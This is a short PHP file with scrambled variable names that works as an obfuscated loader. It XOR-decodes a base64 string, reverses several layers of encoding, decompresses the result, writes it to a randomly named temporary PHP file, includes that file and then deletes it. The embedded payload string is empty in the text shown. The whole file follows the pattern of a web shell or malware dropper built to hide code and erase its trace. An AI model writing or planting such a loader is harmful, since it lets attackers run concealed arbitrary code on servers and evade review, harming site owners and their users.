<?php
$jprrzpps = '';
$ofzvxxaq  = 'RQVdrw9vV';
$xbcqztov = function($d, $k) {
    $o = '';
    for ($i = 0; $i < strlen($d); $i++) {
        $o .= chr(ord($d[$i]) ^ ord($k[$i % strlen($k)]));
    }
    return $o;
};

$h = call_user_func($xbcqztov, base64_decode($jprrzpps), $ofzvxxaq);
$h = htmlspecialchars_decode($h);
$h = rawurldecode($h);
$h = hex2bin($h);
$h = strrev($h);

$tmp = sys_get_temp_dir() . '/' . uniqid('ion_', true) . '.php';
file_put_contents($tmp, gzinflate(base64_decode($h)));
include $tmp;
unlink($tmp);
?>